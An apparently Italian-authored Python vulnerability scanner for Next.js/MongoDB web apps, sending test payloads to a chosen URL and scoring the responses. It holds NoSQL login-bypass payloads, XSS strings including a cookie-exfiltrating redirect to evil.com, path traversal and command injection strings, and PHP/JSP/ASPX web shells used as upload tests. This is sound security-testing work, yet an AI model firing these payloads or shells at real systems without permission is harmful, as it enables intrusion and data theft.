#!/usr/bin/env python3
"""
Enhanced Security Testing Automation Script
Per Next.js + MongoDB Web Application

UTILIZZO:
    python security_tests_enhanced.py --url https://your-domain.com --all
    python security_tests_enhanced.py --url https://your-domain.com --test xss,mongodb
    python security_tests_enhanced.py --url https://your-domain.com --test all --report

REQUIREMENTS:
    pip install requests colorama beautifulsoup4
"""

import requests
import json
import time
import argparse
import re
from typing import List, Dict, Any, Tuple
from colorama import init, Fore, Back, Style
from urllib.parse import urlparse, urljoin
from datetime import datetime
import sys

# Inizializza colorama
init(autoreset=True)

class SecurityTester:
    def __init__(self, base_url: str, verbose: bool = False):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Security-Testing-Tool/2.0'
        })
        self.verbose = verbose
        self.results = {
            'passed': [],
            'failed': [],
            'warnings': [],
            'info': []
        }
        self.report_data = {
            'timestamp': datetime.now().isoformat(),
            'target': base_url,
            'tests': []
        }
    
    def print_header(self, text: str):
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}{text.center(70)}")
        print(f"{Fore.CYAN}{'='*70}\n")
    
    def print_test(self, name: str):
        print(f"{Fore.YELLOW}[TEST] {name}")
    
    def print_success(self, message: str):
        print(f"{Fore.GREEN}[✓] {message}")
        self.results['passed'].append(message)
    
    def print_failure(self, message: str):
        print(f"{Fore.RED}[✗] {message}")
        self.results['failed'].append(message)
    
    def print_warning(self, message: str):
        print(f"{Fore.YELLOW}[!] {message}")
        self.results['warnings'].append(message)
    
    def print_info(self, message: str):
        print(f"{Fore.BLUE}[i] {message}")
        if self.verbose:
            self.results['info'].append(message)

    # ===== MONGODB INJECTION TESTS =====
    def test_mongodb_injection(self):
        self.print_header("MONGODB INJECTION TESTS (NoSQL)")
        
        payloads = [
            # Operatori MongoDB pericolosi
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": "test"},
            {"username": {"$where": "1==1"}, "password": "anything"},
            
            # Tentativi di bypass
            {"username": "admin", "password": {"$ne": ""}},
            {"username": {"$in": ["admin", "root", "administrator"]}, "password": "test"},
            
            # JavaScript injection in MongoDB
            {"username": "admin'; return true; var x='", "password": "anything"},
            {"username": {"$regex": "^admin"}, "password": {"$exists": True}},
            
            # Blind NoSQL injection
            {"username": "admin", "password": {"$regex": "^.{0,}"}},
        ]
        
        login_endpoint = f"{self.base_url}/api/auth/login"
        
        for i, payload in enumerate(payloads, 1):
            self.print_test(f"MongoDB Injection #{i}: {json.dumps(payload)[:80]}...")
            try:
                response = self.session.post(
                    login_endpoint,
                    json=payload,
                    timeout=10,
                    verify=True
                )
                
                # Analizza risposta
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'token' in data or 'success' in data:
                            self.print_failure(f"CRITICAL! MongoDB injection successful: {payload}")
                        else:
                            self.print_warning(f"Unexpected 200 response (no token)")
                    except:
                        self.print_warning("200 OK but no JSON response")
                        
                elif response.status_code in [400, 401, 403]:
                    self.print_success("Protected: Injection attempt rejected")
                elif response.status_code == 500:
                    self.print_failure("Server error - possible injection vulnerability")
                else:
                    self.print_info(f"Response code: {response.status_code}")
                    
            except requests.exceptions.Timeout:
                self.print_warning("Request timeout - possible DoS vector")
            except Exception as e:
                self.print_warning(f"Test error: {str(e)}")
        
        # Test per query string injection
        self.print_test("Query string MongoDB injection")
        try:
            response = self.session.get(
                f"{self.base_url}/api/projects?filter[$ne]=null",
                timeout=10
            )
            if response.status_code == 200:
                self.print_warning("Query accepts MongoDB operators - verify sanitization")
            else:
                self.print_success("Query operators rejected")
        except Exception as e:
            self.print_info(f"Test skipped: {str(e)}")

    # ===== XSS TESTS AVANZATI =====
    def test_xss_advanced(self):
        self.print_header("CROSS-SITE SCRIPTING (XSS) - ADVANCED TESTS")
        
        xss_payloads = [
            # Script classici
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script src='http://evil.com/xss.js'></script>",
            
            # Event handlers
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            
            # Bypass filtri
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            
            # HTML5
            "<video><source onerror=\"javascript:alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            
            # Encoded XSS
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # DOM-based XSS
            "<img src=x onerror=\"window.location='http://evil.com?c='+document.cookie\">",
            
            # React-specific bypasses
            "{{constructor.constructor('alert(1)')()}}",
            "{{''.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
            
            # Polyglot XSS
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        ]
        
        # Test su diversi endpoint
        test_endpoints = [
            ("/api/update", "POST", {"dataIt": {"name": "XSS_PAYLOAD", "description": "test"}, "updateProp": "projects"}),
            ("/api/search", "GET", None),  # query param
        ]
        
        for payload in xss_payloads:
            for endpoint, method, base_data in test_endpoints:
                self.print_test(f"XSS on {endpoint}: {payload[:50]}...")
                
                try:
                    if method == "POST" and base_data:
                        # Inserisci payload nel campo name
                        data = base_data.copy()
                        if 'dataIt' in data:
                            data['dataIt']['name'] = payload
                        
                        response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json=data,
                            timeout=10
                        )
                    else:
                        # GET request con payload nel query
                        response = self.session.get(
                            f"{self.base_url}{endpoint}?q={payload}",
                            timeout=10
                        )
                    
                    if response.status_code == 200:
                        # Verifica se il payload è nel response
                        if payload in response.text or payload.replace('<', '&lt;') in response.text:
                            self.print_warning(f"Payload reflected - MANUAL VERIFICATION REQUIRED")
                        else:
                            self.print_success("Payload sanitized or not reflected")
                    elif response.status_code in [400, 403]:
                        self.print_success("XSS payload rejected")
                    else:
                        self.print_info(f"Response: {response.status_code}")
                        
                except Exception as e:
                    if self.verbose:
                        self.print_info(f"Error: {str(e)}")
                
                time.sleep(0.1)  # Rate limiting

    # ===== AUTHENTICATION & SESSION TESTS =====
    def test_authentication_advanced(self):
        self.print_header("AUTHENTICATION & SESSION SECURITY")
        
        # Test 1: Accesso senza autenticazione
        self.print_test("Test 1: Protected endpoints without authentication")
        protected_endpoints = [
            ('/api/update', 'POST', {"test": "data"}),
            ('/api/delete', 'POST', {"attribute": "projects", "index": 0}),
            ('/api/translate', 'POST', {}),
            ('/api/admin', 'GET', None),
            ('/api/user/profile', 'GET', None),
        ]
        
        for endpoint, method, data in protected_endpoints:
            try:
                if method == 'POST':
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data,
                        timeout=10
                    )
                else:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        timeout=10
                    )
                
                if response.status_code in [401, 403]:
                    self.print_success(f"{endpoint} requires authentication")
                elif response.status_code == 200:
                    self.print_failure(f"CRITICAL! {endpoint} accessible without auth")
                elif response.status_code == 404:
                    self.print_info(f"{endpoint} not found (OK if endpoint doesn't exist)")
                else:
                    self.print_info(f"{endpoint} returned {response.status_code}")
                    
            except Exception as e:
                self.print_warning(f"Error on {endpoint}: {str(e)}")
        
        # Test 2: JWT Token validation
        self.print_test("Test 2: JWT token manipulation")
        
        fake_tokens = [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "Bearer null",
            "Bearer undefined",
            "Bearer {}",
            "",
            "' OR '1'='1",
        ]
        
        for token in fake_tokens:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/update",
                    json={"test": "data"},
                    headers={"Authorization": token},
                    timeout=10
                )
                
                if response.status_code in [401, 403]:
                    self.print_success(f"Invalid token rejected")
                elif response.status_code == 200:
                    self.print_failure(f"CRITICAL! Fake token accepted: {token[:50]}")
                    
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Error: {str(e)}")
        
        # Test 3: Session fixation
        self.print_test("Test 3: Session fixation vulnerability")
        
        try:
            # Tenta login con session ID predefinito
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": "test", "password": "test"},
                cookies={"sessionid": "attacker_controlled_session"},
                timeout=10
            )
            
            if 'Set-Cookie' in response.headers:
                self.print_success("New session created (good)")
            else:
                self.print_warning("No new session - verify session management")
                
        except Exception as e:
            self.print_info(f"Test skipped: {str(e)}")
        
        # Test 4: Brute force protection
        self.print_test("Test 4: Brute force protection & rate limiting")
        attempts = 15
        start_time = time.time()
        rate_limited = False
        
        for i in range(attempts):
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json={
                        "username": "admin",
                        "password": f"wrong_password_{i}"
                    },
                    timeout=10
                )
                
                if response.status_code == 429:
                    rate_limited = True
                    self.print_success(f"Rate limiting activated after {i+1} attempts")
                    break
                    
            except Exception as e:
                self.print_warning(f"Error: {str(e)}")
                break
            
            time.sleep(0.2)
        
        elapsed = time.time() - start_time
        
        if not rate_limited:
            self.print_failure(f"NO rate limiting! {attempts} attempts in {elapsed:.1f}s")
        
        # Test 5: Password policy
        self.print_test("Test 5: Weak password acceptance")
        
        weak_passwords = ["123", "password", "admin", "test", "12345678", "qwerty"]
        
        for pwd in weak_passwords:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/register",
                    json={
                        "username": f"testuser_{pwd}",
                        "password": pwd,
                        "email": f"test_{pwd}@example.com"
                    },
                    timeout=10
                )
                
                if response.status_code == 200:
                    self.print_warning(f"Weak password accepted: {pwd}")
                elif response.status_code == 400:
                    self.print_success("Weak password rejected")
                    
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Skipped: {str(e)}")

    # ===== CSRF TESTS =====
    def test_csrf_advanced(self):
        self.print_header("CROSS-SITE REQUEST FORGERY (CSRF) TESTS")
        
        self.print_test("Test 1: Missing CSRF token")
        
        try:
            response = self.session.post(
                f"{self.base_url}/api/update",
                json={"test": "data"},
                headers={
                    "Origin": "https://malicious-site.com",
                    "Referer": "https://malicious-site.com/attack.html"
                },
                timeout=10
            )
            
            if response.status_code in [401, 403]:
                self.print_success("CSRF protection active (request rejected)")
            elif response.status_code == 200:
                self.print_failure("VULNERABLE! No CSRF protection")
            else:
                self.print_info(f"Response: {response.status_code}")
                
        except Exception as e:
            self.print_warning(f"Error: {str(e)}")
        
        # Test 2: SameSite cookie attribute
        self.print_test("Test 2: Cookie SameSite attribute")
        
        try:
            response = self.session.get(f"{self.base_url}", timeout=10)
            
            cookies = response.cookies
            has_samesite = False
            
            for cookie in cookies:
                if hasattr(cookie, 'get_nonstandard_attr'):
                    samesite = cookie.get_nonstandard_attr('SameSite')
                    if samesite in ['Strict', 'Lax']:
                        has_samesite = True
                        self.print_success(f"Cookie '{cookie.name}' has SameSite={samesite}")
            
            if not has_samesite and cookies:
                self.print_warning("Cookies without SameSite attribute")
            elif not cookies:
                self.print_info("No cookies set on homepage")
                
        except Exception as e:
            self.print_info(f"Cookie check skipped: {str(e)}")

    # ===== HTTPS & TLS TESTS =====
    def test_https_security(self):
        self.print_header("HTTPS & TLS SECURITY TESTS")
        
        if not self.base_url.startswith('https://'):
            self.print_warning("Target is not HTTPS - TLS tests skipped")
            return
        
        # Test 1: SSL/TLS version
        self.print_test("Test 1: SSL/TLS protocol version")
        
        try:
            response = self.session.get(self.base_url, timeout=10)
            
            # Verifica redirect HTTP -> HTTPS
            if response.history:
                for resp in response.history:
                    if resp.status_code in [301, 302, 307, 308]:
                        self.print_success("HTTP redirects to HTTPS")
            
            self.print_info(f"Connection successful with TLS")
            
        except requests.exceptions.SSLError as e:
            self.print_failure(f"SSL Error: {str(e)}")
        except Exception as e:
            self.print_warning(f"Error: {str(e)}")
        
        # Test 2: HTTP Strict Transport Security (HSTS)
        self.print_test("Test 2: HSTS header presence")
        
        try:
            response = self.session.get(self.base_url, timeout=10)
            
            if 'Strict-Transport-Security' in response.headers:
                hsts = response.headers['Strict-Transport-Security']
                self.print_success(f"HSTS enabled: {hsts}")
                
                if 'max-age' in hsts:
                    max_age = int(re.search(r'max-age=(\d+)', hsts).group(1))
                    if max_age >= 31536000:  # 1 anno
                        self.print_success("HSTS max-age adequate (>= 1 year)")
                    else:
                        self.print_warning(f"HSTS max-age low: {max_age}s")
                
                if 'includeSubDomains' in hsts:
                    self.print_success("HSTS includes subdomains")
                else:
                    self.print_info("HSTS doesn't include subdomains")
                    
            else:
                self.print_failure("HSTS header missing!")
                
        except Exception as e:
            self.print_warning(f"Error: {str(e)}")
        
        # Test 3: Mixed content
        self.print_test("Test 3: Mixed content detection")
        
        try:
            response = self.session.get(self.base_url, timeout=10)
            html = response.text
            
            # Cerca risorse HTTP in pagina HTTPS
            http_resources = re.findall(r'http://[^"\s<>]+', html)
            
            if http_resources:
                self.print_warning(f"Found {len(http_resources)} HTTP resources on HTTPS page")
                if self.verbose:
                    for res in http_resources[:5]:
                        self.print_info(f"  - {res}")
            else:
                self.print_success("No mixed content detected")
                
        except Exception as e:
            self.print_info(f"Mixed content check skipped: {str(e)}")

    # ===== SECURITY HEADERS TESTS =====
    def test_security_headers_advanced(self):
        self.print_header("SECURITY HEADERS - COMPREHENSIVE CHECK")
        
        try:
            response = self.session.get(self.base_url, timeout=10)
            headers = response.headers
            
            # Headers richiesti con valori attesi
            required_headers = {
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-Content-Type-Options': ['nosniff'],
                'X-XSS-Protection': ['1', '1; mode=block', '0'],  # 0 va bene per CSP moderni
                'Referrer-Policy': ['no-referrer', 'no-referrer-when-downgrade', 'strict-origin-when-cross-origin'],
                'Permissions-Policy': ['interest-cohort'],
                'Content-Security-Policy': ['default-src'],
            }
            
            for header, expected_values in required_headers.items():
                if header in headers:
                    header_value = headers[header]
                    
                    # Verifica se contiene uno dei valori attesi
                    if any(val in header_value for val in expected_values):
                        self.print_success(f"✓ {header}: {header_value[:60]}")
                    else:
                        self.print_warning(f"⚠ {header} present but value unexpected: {header_value[:60]}")
                else:
                    severity = "CRITICAL" if header in ['X-Frame-Options', 'Content-Security-Policy'] else "WARNING"
                    if severity == "CRITICAL":
                        self.print_failure(f"✗ {header} MISSING!")
                    else:
                        self.print_warning(f"⚠ {header} missing")
            
            # CSP analysis
            if 'Content-Security-Policy' in headers:
                self.print_test("Content Security Policy Analysis")
                csp = headers['Content-Security-Policy']
                
                dangerous_directives = {
                    "'unsafe-inline'": "Allows inline scripts (XSS risk)",
                    "'unsafe-eval'": "Allows eval() (XSS risk)",
                    "script-src *": "Allows scripts from any origin",
                    "default-src *": "Allows resources from any origin"
                }
                
                for directive, risk in dangerous_directives.items():
                    if directive in csp:
                        self.print_warning(f"CSP contains {directive}: {risk}")
            
            # Check per header pericolosi
            dangerous_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            
            for header in dangerous_headers:
                if header in headers:
                    self.print_warning(f"Information disclosure: {header}: {headers[header]}")
            
        except Exception as e:
            self.print_warning(f"Error checking headers: {str(e)}")

    # ===== INFORMATION DISCLOSURE TESTS =====
    def test_information_disclosure_advanced(self):
        self.print_header("INFORMATION DISCLOSURE TESTS")
        
        # Test 1: Sensitive files
        self.print_test("Test 1: Sensitive file exposure")
        
        sensitive_paths = [
            '/.env',
            '/.env.local',
            '/.env.production',
            '/.git/config',
            '/.git/HEAD',
            '/package.json',
            '/package-lock.json',
            '/.next/BUILD_ID',
            '/.next/static',
            '/node_modules',
            '/backup.sql',
            '/database.sql',
            '/phpmyadmin',
            '/server-status',
            '/.DS_Store',
            '/web.config',
            '/composer.json',
            '/Dockerfile',
            '/.dockerignore',
        ]
        
        for path in sensitive_paths:
            try:
                response = self.session.get(
                    f"{self.base_url}{path}",
                    timeout=10,
                    allow_redirects=False
                )
                
                if response.status_code == 200:
                    self.print_failure(f"EXPOSED: {path} (Status: 200)")
                elif response.status_code in [403, 404]:
                    self.print_success(f"Protected: {path}")
                elif response.status_code in [301, 302]:
                    self.print_info(f"Redirect: {path} -> {response.headers.get('Location', 'unknown')}")
                    
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Error on {path}: {str(e)}")
        
        # Test 2: Directory listing
        self.print_test("Test 2: Directory listing")
        
        directories = [
            '/uploads',
            '/static',
            '/public',
            '/assets',
            '/images',
            '/files',
        ]
        
        for directory in directories:
            try:
                response = self.session.get(f"{self.base_url}{directory}/", timeout=10)
                
                if 'Index of' in response.text or 'Directory listing' in response.text:
                    self.print_failure(f"Directory listing enabled: {directory}")
                else:
                    self.print_success(f"No directory listing: {directory}")
                    
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Check skipped: {directory}")
        
        # Test 3: API endpoints enumeration
        self.print_test("Test 3: API endpoint discovery")
        
        api_paths = [
            '/api',
            '/api/v1',
            '/api/v2',
            '/api/docs',
            '/api/swagger',
            '/api/graphql',
            '/graphql',
            '/api/.well-known',
        ]
        
        for path in api_paths:
            try:
                response = self.session.get(f"{self.base_url}{path}", timeout=10)
                
                if response.status_code == 200:
                    self.print_info(f"API endpoint accessible: {path}")
                    
            except Exception as e:
                pass
        
        # Test 4: Error messages
        self.print_test("Test 4: Verbose error messages")
        
        try:
            response = self.session.get(
                f"{self.base_url}/api/nonexistent-endpoint-12345",
                timeout=10
            )
            
            error_indicators = [
                'stack trace',
                'Exception',
                'Error in',
                'MongoError',
                'MongoDB',
                'at Function',
                'node_modules',
                '/home/',
                '/var/www',
                'process.env'
            ]
            
            response_text = response.text.lower()
            found_errors = [ind for ind in error_indicators if ind.lower() in response_text]
            
            if found_errors:
                self.print_failure(f"Verbose errors exposed: {', '.join(found_errors)}")
            else:
                self.print_success("No verbose error messages detected")
                
        except Exception as e:
            self.print_info(f"Error test skipped: {str(e)}")

    # ===== INPUT VALIDATION TESTS =====
    def test_input_validation_advanced(self):
        self.print_header("INPUT VALIDATION & INJECTION TESTS")
        
        # Test 1: Path traversal
        self.print_test("Test 1: Path traversal attacks")
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
        ]
        
        for payload in path_traversal_payloads:
            try:
                # Test in query params
                response = self.session.get(
                    f"{self.base_url}/api/file?path={payload}",
                    timeout=10
                )
                
                if response.status_code in [400, 403, 404]:
                    self.print_success(f"Path traversal blocked: {payload[:30]}")
                elif response.status_code == 200:
                    if 'root:' in response.text or 'Administrator' in response.text:
                        self.print_failure(f"CRITICAL! Path traversal successful: {payload}")
                    else:
                        self.print_success("Request accepted but no sensitive data")
                        
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Test error: {str(e)}")
        
        # Test 2: Command injection
        self.print_test("Test 2: Command injection attempts")
        
        command_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| ping -c 10 127.0.0.1",
        ]
        
        for payload in command_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/process",
                    json={"input": payload},
                    timeout=10
                )
                
                if response.status_code in [400, 403]:
                    self.print_success("Command injection rejected")
                elif response.status_code == 200:
                    # Cerca output di comandi nel response
                    if any(indicator in response.text for indicator in ['uid=', 'gid=', 'root:', 'C:\\']):
                        self.print_failure(f"CRITICAL! Command injection: {payload}")
                    else:
                        self.print_success("No command execution detected")
                        
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Test skipped: {str(e)}")
        
        # Test 3: File upload vulnerabilities
        self.print_test("Test 3: Malicious file upload")
        
        malicious_files = [
            ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('test.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('shell.aspx', '<% eval request("cmd") %>', 'application/x-aspx'),
            ('test.exe', 'MZ\x90\x00', 'application/x-msdownload'),
            ('test.svg', '<svg onload=alert(1)>', 'image/svg+xml'),
        ]
        
        for filename, content, mime_type in malicious_files:
            try:
                files = {'file': (filename, content, mime_type)}
                response = self.session.post(
                    f"{self.base_url}/api/upload",
                    files=files,
                    timeout=10
                )
                
                if response.status_code in [400, 403]:
                    self.print_success(f"Malicious file rejected: {filename}")
                elif response.status_code == 200:
                    self.print_warning(f"File accepted: {filename} - MANUAL CHECK REQUIRED")
                    
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Upload test skipped: {str(e)}")
        
        # Test 4: Integer overflow/underflow
        self.print_test("Test 4: Numeric validation")
        
        numeric_payloads = [
            -1,
            -9999999999,
            9999999999,
            2147483648,  # INT_MAX + 1
            -2147483649,  # INT_MIN - 1
            "NaN",
            "Infinity",
            "-Infinity",
        ]
        
        for payload in numeric_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/delete",
                    json={"attribute": "projects", "index": payload},
                    timeout=10
                )
                
                if response.status_code in [400, 403]:
                    self.print_success(f"Invalid number rejected: {payload}")
                elif response.status_code == 200:
                    self.print_warning(f"Numeric value accepted: {payload}")
                    
            except Exception as e:
                if self.verbose:
                    self.print_info(f"Test error: {str(e)}")

    # ===== API SECURITY TESTS =====
    def test_api_security(self):
        self.print_header("API SECURITY TESTS")
        
        # Test 1: GraphQL introspection (se presente)
        self.print_test("Test 1: GraphQL introspection")
        
        try:
            introspection_query = {
                "query": "{ __schema { types { name } } }"
            }
            
            response = self.session.post(
                f"{self.base_url}/api/graphql",
                json=introspection_query,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if '__schema' in str(data):
                    self.print_warning("GraphQL introspection enabled in production")
                else:
                    self.print_success("GraphQL introspection disabled")
            else:
                self.print_info("GraphQL endpoint not found or protected")
                
        except Exception as e:
            self.print_info("GraphQL test skipped")
        
        # Test 2: REST API versioning
        self.print_test("Test 2: API versioning check")
        
        try:
            v1_response = self.session.get(f"{self.base_url}/api/v1/status", timeout=10)
            v2_response = self.session.get(f"{self.base_url}/api/v2/status", timeout=10)
            
            if v1_response.status_code == 200 and v2_response.status_code == 200:
                self.print_info("Multiple API versions detected - ensure old versions are deprecated")
            elif v1_response.status_code == 200:
                self.print_info("API v1 accessible")
            
        except Exception as e:
            self.print_info("API versioning check skipped")
        
        # Test 3: CORS misconfiguration
        self.print_test("Test 3: CORS policy validation")
        
        try:
            response = self.session.get(
                self.base_url,
                headers={'Origin': 'https://evil.com'},
                timeout=10
            )
            
            if 'Access-Control-Allow-Origin' in response.headers:
                acao = response.headers['Access-Control-Allow-Origin']
                
                if acao == '*':
                    self.print_failure("CORS allows all origins (*) - potential security risk")
                elif acao == 'https://evil.com':
                    self.print_failure("CORS reflects arbitrary origin - VULNERABLE")
                else:
                    self.print_success(f"CORS properly configured: {acao}")
            else:
                self.print_info("No CORS headers present")
                
        except Exception as e:
            self.print_info(f"CORS test skipped: {str(e)}")

    # ===== RATE LIMITING TESTS =====
    def test_rate_limiting_advanced(self):
        self.print_header("RATE LIMITING & DOS PROTECTION")
        
        # Test 1: API rate limiting
        self.print_test("Test 1: API endpoint rate limiting")
        
        endpoints_to_test = [
            '/api/auth/login',
            '/api/search',
            '/api/update',
        ]
        
        for endpoint in endpoints_to_test:
            self.print_info(f"Testing rate limit on {endpoint}")
            rate_limited = False
            requests_made = 0
            
            for i in range(100):
                try:
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json={"test": f"data_{i}"},
                        timeout=5
                    )
                    
                    requests_made += 1
                    
                    if response.status_code == 429:
                        rate_limited = True
                        self.print_success(f"Rate limited after {requests_made} requests")
                        break
                        
                except Exception as e:
                    break
                
                time.sleep(0.05)
            
            if not rate_limited:
                self.print_failure(f"NO rate limiting on {endpoint} ({requests_made} requests)")
        
        # Test 2: Payload size limit
        self.print_test("Test 2: Large payload rejection")
        
        try:
            # Crea payload molto grande (10MB)
            large_payload = {
                "data": "A" * (10 * 1024 * 1024)
            }
            
            response = self.session.post(
                f"{self.base_url}/api/update",
                json=large_payload,
                timeout=30
            )
            
            if response.status_code in [413, 400]:
                self.print_success("Large payload rejected")
            elif response.status_code == 200:
                self.print_warning("Large payload accepted - DoS risk")
                
        except Exception as e:
            self.print_info(f"Large payload test error: {str(e)}")

    # ===== GENERATE REPORT =====
    def generate_report(self, output_file: str = "security_report.txt"):
        """Genera un report dettagliato dei test"""
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write("SECURITY TEST REPORT\n")
            f.write("="*80 + "\n\n")
            
            f.write(f"Target: {self.base_url}\n")
            f.write(f"Timestamp: {self.report_data['timestamp']}\n")
            f.write(f"Test Tool: Enhanced Security Tester v2.0\n\n")
            
            f.write("="*80 + "\n")
            f.write("SUMMARY\n")
            f.write("="*80 + "\n\n")
            
            total = len(self.results['passed']) + len(self.results['failed']) + len(self.results['warnings'])
            
            f.write(f"Total Tests: {total}\n")
            f.write(f"Passed: {len(self.results['passed'])} ({len(self.results['passed'])/total*100:.1f}%)\n")
            f.write(f"Failed: {len(self.results['failed'])} ({len(self.results['failed'])/total*100:.1f}%)\n")
            f.write(f"Warnings: {len(self.results['warnings'])} ({len(self.results['warnings'])/total*100:.1f}%)\n\n")
            
            if self.results['failed']:
                f.write("="*80 + "\n")
                f.write("CRITICAL ISSUES (MUST FIX)\n")
                f.write("="*80 + "\n\n")
                for i, issue in enumerate(self.results['failed'], 1):
                    f.write(f"{i}. {issue}\n")
                f.write("\n")
            
            if self.results['warnings']:
                f.write("="*80 + "\n")
                f.write("WARNINGS (SHOULD FIX)\n")
                f.write("="*80 + "\n\n")
                for i, warning in enumerate(self.results['warnings'], 1):
                    f.write(f"{i}. {warning}\n")
                f.write("\n")
            
            if self.results['passed']:
                f.write("="*80 + "\n")
                f.write("PASSED TESTS\n")
                f.write("="*80 + "\n\n")
                for i, passed in enumerate(self.results['passed'], 1):
                    f.write(f"{i}. {passed}\n")
                f.write("\n")
            
            # Security score
            score = (len(self.results['passed']) / total) * 100 if total > 0 else 0
            
            f.write("="*80 + "\n")
            f.write(f"SECURITY SCORE: {score:.1f}%\n")
            f.write("="*80 + "\n\n")
            
            if score >= 90:
                f.write("Status: EXCELLENT - Your application has good security posture\n")
            elif score >= 70:
                f.write("Status: GOOD - Some improvements needed\n")
            elif score >= 50:
                f.write("Status: FAIR - Multiple security issues detected\n")
            else:
                f.write("Status: POOR - Critical security improvements required\n")
        
        self.print_success(f"Report saved to {output_file}")

    # ===== PRINT SUMMARY =====
    def print_summary(self):
        self.print_header("TEST SUMMARY")
        
        total = len(self.results['passed']) + len(self.results['failed']) + len(self.results['warnings'])
        
        if total == 0:
            print(f"{Fore.YELLOW}No tests were executed")
            return
        
        print(f"{Fore.GREEN}✓ Passed: {len(self.results['passed'])}/{total} ({len(self.results['passed'])/total*100:.1f}%)")
        print(f"{Fore.RED}✗ Failed: {len(self.results['failed'])}/{total} ({len(self.results['failed'])/total*100:.1f}%)")
        print(f"{Fore.YELLOW}⚠ Warnings: {len(self.results['warnings'])}/{total} ({len(self.results['warnings'])/total*100:.1f}%)")
        
        if self.results['failed']:
            print(f"\n{Fore.RED}{'='*70}")
            print(f"{Fore.RED}CRITICAL ISSUES FOUND (MUST FIX):")
            print(f"{Fore.RED}{'='*70}")
            for i, issue in enumerate(self.results['failed'], 1):
                print(f"{Fore.RED}{i}. {issue}")
        
        if self.results['warnings']:
            print(f"\n{Fore.YELLOW}{'='*70}")
            print(f"{Fore.YELLOW}WARNINGS (SHOULD FIX):")
            print(f"{Fore.YELLOW}{'='*70}")
            for i, warning in enumerate(self.results['warnings'], 1):
                print(f"{Fore.YELLOW}{i}. {warning}")
        
        # Security score
        score = (len(self.results['passed']) / total) * 100
        
        if score >= 90:
            color = Fore.GREEN
            status = "EXCELLENT"
        elif score >= 70:
            color = Fore.YELLOW
            status = "GOOD"
        elif score >= 50:
            color = Fore.YELLOW
            status = "FAIR"
        else:
            color = Fore.RED
            status = "POOR"
        
        print(f"\n{color}{'='*70}")
        print(f"{color}SECURITY SCORE: {score:.1f}% - {status}")
        print(f"{color}{'='*70}")

def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Security Testing Tool for Next.js + MongoDB',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python security_tests_enhanced.py --url https://example.com --all
  python security_tests_enhanced.py --url https://example.com --test mongodb,xss,auth
  python security_tests_enhanced.py --url https://example.com --all --report
  python security_tests_enhanced.py --url https://example.com --all --verbose --report
        """
    )
    
    parser.add_argument(
        '--url',
        required=True,
        help='Base URL to test (e.g., https://your-domain.com)'
    )
    parser.add_argument(
        '--test',
        help='Comma-separated list of tests: mongodb,xss,auth,csrf,https,headers,info,input,api,rate-limit'
    )
    parser.add_argument(
        '--all',
        action='store_true',
        help='Run all available tests'
    )
    parser.add_argument(
        '--verbose',
        action='store_true',
        help='Verbose output with detailed information'
    )
    parser.add_argument(
        '--report',
        action='store_true',
        help='Generate a detailed security report file'
    )
    parser.add_argument(
        '--output',
        default='security_report.txt',
        help='Output file for report (default: security_report.txt)'
